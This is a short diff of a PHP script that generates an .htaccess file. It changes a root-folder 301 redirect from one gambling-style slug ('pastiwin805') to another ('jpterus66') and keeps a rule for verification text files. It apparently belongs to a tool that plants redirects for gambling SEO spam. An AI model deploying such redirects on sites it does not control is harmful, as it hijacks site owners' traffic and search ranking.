@@ -154,8 +154,8 @@ foreach ($verificationFiles as $filename => $content) {
 $htaccessContent = <<<HTACCESS
 RewriteEngine On
 
-# === 0. Redirect root folder (misal /service/ atau /blog/) ke /pastiwin805
-RewriteRule ^$ pastiwin805 [R=301,L]
+# === 0. Redirect root folder (misal /service/ atau /blog/) ke /jpterus66
+RewriteRule ^$ jpterus66 [R=301,L]
 
 # === 1. Biarkan file .txt, .xml, dan robots.txt langsung diakses
 RewriteCond %{REQUEST_URI} \.(txt|xml)$ [NC,OR]
